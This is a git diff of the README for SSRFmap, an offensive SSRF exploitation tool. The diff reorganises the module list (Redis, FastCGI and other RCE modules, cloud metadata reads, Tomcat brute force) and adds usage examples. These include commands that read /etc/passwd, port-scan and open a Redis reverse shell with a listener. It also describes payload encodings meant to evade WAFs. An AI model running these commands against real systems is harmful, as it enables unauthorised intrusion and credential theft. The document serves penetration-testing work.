@@ -4,7 +4,32 @@ SSRF are often used to leverage actions on other services, this framework aims t
 
 > Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
 
-## Guide / RTFM
+## Modules
+
+The following modules are already implemented and can be used with the `-m` argument.
+
+| Name           | Description    |
+| :------------- | :------------- |
+| `fastcgi`      | FastCGI RCE |
+| `redis`        | Redis RCE |
+| `github`       | Github Enterprise RCE < 2.8.7 |
+| `zabbix`       | Zabbix RCE |
+| `mysql`        | MySQL Command execution |
+| `docker`       | Docker Infoleaks via API |
+| `smtp`         | SMTP send mail |
+| `portscan`     | Scan ports for the host |
+| `networkscan`  | HTTP Ping sweep over the network |
+| `readfiles`    | Read files such as `/etc/passwd` |
+| `alibaba`      | Read files from the provider (e.g: meta-data, user-data) |
+| `aws`          | Read files from the provider (e.g: meta-data, user-data) |
+| `gce`          | Read files from the provider (e.g: meta-data, user-data) |
+| `digitalocean` | Read files from the provider (e.g: meta-data, user-data) |
+| `socksproxy`   | SOCKS4 Proxy |
+| `smbhash`      | Force an SMB authentication via a UNC Path |
+| `tomcat`       | Bruteforce attack against Tomcat Manager |
+
+
+## Install and Manual
 
 Basic install from the Github repository.
 
@@ -31,22 +56,58 @@ optional arguments:
   --level [LEVEL]     Level of test to perform (1-5, default: 1)
 ```
 
-The default way to use this script is the following.
+## SSRFmap - Basic use
+
+First you need a request with a parameter to fuzz, Burp requests works well with SSRFmap. 
+They should look like the following. More examples are available in the **/data** folder.
+
+```powershell
+POST /ssrf HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://mysimple.ssrf/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+url=https%3A%2F%2Fwww.google.fr
+```
+
+Use the `-m` followed by module name (separated by a `,` if you want to launch several modules).
 
 ```powershell
 # Launch a portscan on localhost and read default files
 python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan
+```
 
+If you need to have a custom user-agent use the `--uagent`. Some targets will use HTTPS, you can enable it with `--ssl`.
+
+```powershell
 # Launch a portscan against an HTTPS endpoint using a custom user-agent
 python ssrfmap.py -r data/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
+```
 
+Some modules allow you to create a connect back, you have to specify LHOST and LPORT. Also SSRFmap can listen for the incoming reverse shell.
+
+```powershell
 # Triggering a reverse shell on a Redis
 python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242
 
 # -l create a listener for reverse shell on the specified port
 # --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload
+```
+
+When the target is protected by a WAF or some filters you can try a wide range of payloads and encoding with the parameter `--level`.
+
+```powershell
 # --level : ability to tweak payloads in order to bypass some IDS/WAF. e.g: 127.0.0.1 -> [::] -> 0000: -> ...
 ```
+
+## SSRFmap Tests
 
 A quick way to test the framework can be done with `data/example.py` SSRF service.
 
@@ -55,45 +116,10 @@ FLASK_APP=data/example.py flask run &
 python ssrfmap.py -r data/request.txt -p url -m readfiles
 ```
 
-## Modules
-
-The following modules are already implemented and can be used with the `-m` argument.
-
-| Name           | Description    |
-| :------------- | :------------- |
-| `fastcgi`      | FastCGI RCE |
-| `redis`        | Redis RCE |
-| `github`       | Github Enterprise RCE < 2.8.7 |
-| `zabbix`       | Zabbix RCE |
-| `mysql`        | MySQL Command execution |
-| `docker`       | Docker Infoleaks via API |
-| `smtp`         | SMTP send mail |
-| `portscan`     | Scan ports for the host |
-| `networkscan`  | HTTP Ping sweep over the network |
-| `readfiles`    | Read files such as `/etc/passwd` |
-| `alibaba`      | Read files from the provider (e.g: meta-data, user-data) |
-| `aws`          | Read files from the provider (e.g: meta-data, user-data) |
-| `gce`          | Read files from the provider (e.g: meta-data, user-data) |
-| `digitalocean` | Read files from the provider (e.g: meta-data, user-data) |
-| `socksproxy`   | SOCKS4 Proxy |
-| `smbhash`      | Force an SMB authentication via a UNC Path |
-| `tomcat`       | Bruteforce attack against Tomcat Manager |
-
 ## Contribute
 
-I <3 pull requests :)
+I :heart: pull requests :)
 Feel free to add any feature listed below or a new service.
-
-- aws and other cloud providers - extract sensitive data from http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy and more
-- handle request with file in requester
-- requester injection point in file (if param = None, check SSRFMAP in reqFile and replace with the payload)
-- add https://github.com/cujanovic/SSRF-Testing ip.py into the ip generator from core.utils
-
-  ```powershell
-  http://0xA9FEA9FE/ Dotless hexadecimal
-  http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
-  http://0251.00376.000251.0000376/ Dotted octal with padding
-  ```
 
 The following code is a template if you wish to add a module interacting with a service.
 
